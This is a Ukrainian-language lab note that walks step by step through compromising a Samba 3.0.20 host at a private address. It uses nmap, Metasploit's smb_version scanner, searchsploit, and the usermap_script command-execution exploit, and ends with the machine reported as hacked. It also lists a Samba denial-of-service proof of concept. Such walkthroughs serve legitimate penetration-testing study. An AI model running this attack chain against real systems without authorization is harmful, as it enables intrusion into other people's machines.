якщо в результатах [[сканування]] :
[[nmap]] -sV 192.168.1.58

розглянути ці два рядки :
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKG
можна побачити що в нас немає точної версії Samba прямо в результатах сканування.
потрібно вирішити який експлоіт використовувати і як його знайти.
спочатку подивимось всередині фреймворку метасплойт:
msfconsole - заходимо у метасплоіт фреймворк
searchsploit samba  -рабираємо в фреймворку і отримуємо багато результів для різних версій samba
щоб точніше взнати версію samba потрібно використати інший сканер, так як nmap не дало бажаного результату.
для цього вводимо пошук samba:
search samba
і отримуємо деякі результи. Дуякі з них являються експлойтами, деякі допоміжними модулями.
Визначаємо доступні допоміжні сканери 
use auxiliary/scanner/smb
знаходимо і копіюємо версію :
auxiliary/scanner/smb/smb_version 
і вставляємо команду :
use auxiliary/scanner/smb/smb_version 
якщо ввести показати інформацію прямо в терміналі:
show info 
то отримаємо інфу про версію відображення кожної системи

Тепер треба ввести всі необхідні параметри для роботи 
show options
як бачимо нижче треба ввести параметри хоста:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  RHOSTS                    yes       The target host(s), see h
це робиться за допомогою команди set:
set RHOSTS 192.168.1.58

потім його запускаєм командою **run** :
run
і отримуємо точну версію samba:
[*] 192.168.1.58:445      -   Host could not be identified: Unix (Samba 3.0.20-Debian)
це Samba 3.0.20

Тепер у новому вікні терміналу вводимо пошук з відомою версією експлойту.:
searchsploit Samba 3.0.20 
і маємо лише чотири результати пошуку, з яких підходить лише :
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execu | unix/remote/16320.rb

щця стрічка впливає на проведення ДОС атак, то до звіту про мою роботу вона також має включатися:
Samba < 3.6.2 (x86) - Denial of Service (PoC)                   | linux_x86/dos/36741.py
саме цінне тут те що ми знайшли назву сценарію :
'Username' map script'
і тепер порівняємо і знайдемо цей сценарій (DESCRIPTION) в результатах першого пошуку коли ми отримали дуже багато результатів тому що не мали точної версії samba
це там де картинка і ми вводили команду **search samba** 

коли знайдемо експлоїт з ідентичною назвою :
15  exploit/multi/samba/usermap_script                           2007-05-14       excellent  No     Samba "username map script" Command Execution

то скопіюємо його:

exploit/multi/samba/usermap_script 
в тому вікні де ми зайшли в метасплоіт(з картинкою) вводимо:
use exploit/multi/samba/usermap_script 
 і далі вводимо порт :
 set RHOSTS 192.168.1.58
і далі запускаємо **run**:
 run
отже машина зламана:
msf6 exploit(multi/samba/usermap_script) > run
